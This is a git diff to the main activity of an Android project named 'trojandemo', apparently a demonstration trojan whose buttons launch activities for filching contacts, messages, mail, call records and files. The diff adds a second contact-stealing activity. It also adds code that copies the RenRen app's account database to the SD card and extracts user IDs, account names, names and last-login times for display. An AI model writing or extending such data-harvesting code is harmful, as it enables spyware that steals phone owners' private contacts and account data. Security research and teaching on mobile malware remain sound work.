@@ -10,18 +10,13 @@ import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
-
-import com.singuloid.trojandemo.utils.DBHelper;
 import com.singuloid.trojandemo.utils.Utils;
-
-import java.io.File;
-import java.io.IOException;
-
 
 public class MainActivity extends Activity implements View.OnClickListener {
 
     private static final String TAG = "MainActivity";
     private Button mContacts, mContacts2, mText, mText2, mMail, mMail2, mCallRecords, mCallRecords2, mTxt, mTxt2, mRenRen;
+    Cursor cursor;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -63,7 +58,8 @@ public class MainActivity extends Activity implements View.OnClickListener {
                 startActivity(new Intent(this, FilchContacts.class));
                 break;
             case R.id.contacts2:
-                dialog("联系人");
+                startActivity(new Intent(this, FilchWosContacts.class));
+//                dialog("联系人");
                 break;
             case R.id.text:
                 textIntent.putExtra("isWorkPhone", false);
@@ -107,8 +103,9 @@ public class MainActivity extends Activity implements View.OnClickListener {
                     Utils.copyRenrenDbToMe();
                     SQLiteDatabase db = SQLiteDatabase.openDatabase("/sdcard/account.db", null, SQLiteDatabase.OPEN_READONLY);
 //                SQLiteDatabase db = openOrCreateDatabase("/sdcard/account.db", this.MODE_PRIVATE ,null);
-                    getMessage(db);
-                } catch (Exception e){
+                    String str = getMessage(db);
+                    msgDialog(str);
+                } catch (Exception e) {
                     dialog("数据库");
                 }
 
@@ -116,11 +113,12 @@ public class MainActivity extends Activity implements View.OnClickListener {
         }
     }
 
-    private void getMessage(SQLiteDatabase db){
+    private String getMessage(SQLiteDatabase db) {
         String sql = "select * from account";
-        Cursor cursor = db.rawQuery(sql, null);
-//        Cursor cursor = db.query("account", new String[]{"uid", "account", "name", "last_login_time"}, null, null, null, null, null);
+        cursor = db.rawQuery(sql, null);
 
+//        Cursor cursor = db.query("account", new String[]{"uid", "account", "name", "last_login_time"}, null, null, null, null, null);
+        StringBuilder msgBuilder = new StringBuilder();
         if (cursor.moveToFirst()) {
             for (int i = 0; i < cursor.getCount(); i++) {
                 cursor.move(i);
@@ -129,8 +127,15 @@ public class MainActivity extends Activity implements View.OnClickListener {
                 String name = cursor.getString(cursor.getColumnIndex("name"));
                 String last_login_time = cursor.getString(cursor.getColumnIndex("last_login_time"));
                 Log.e(TAG, uid + account + name + last_login_time);
+                msgBuilder.append("[ ");
+                msgBuilder.append("uid = " + uid + ", ");
+                msgBuilder.append("account = " + account + ", ");
+                msgBuilder.append("name = " + name + ", ");
+                msgBuilder.append("last_login_time = " + last_login_time + ", ");
+                msgBuilder.append(" ]\n\n");
             }
-        }
+            return msgBuilder.toString();
+        } else return "no message to show!";
     }
 
     private void dialog(String str) {
@@ -146,8 +151,24 @@ public class MainActivity extends Activity implements View.OnClickListener {
         builder.create().show();
     }
 
+    private void msgDialog(String str) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("MESSAGE");
+        builder.setMessage(str);
+        builder.setNeutralButton("确定", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                dialog.dismiss();
+            }
+        });
+        builder.create().show();
+    }
+
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        if (cursor != null) {
+            cursor.close();
+        }
     }
 }
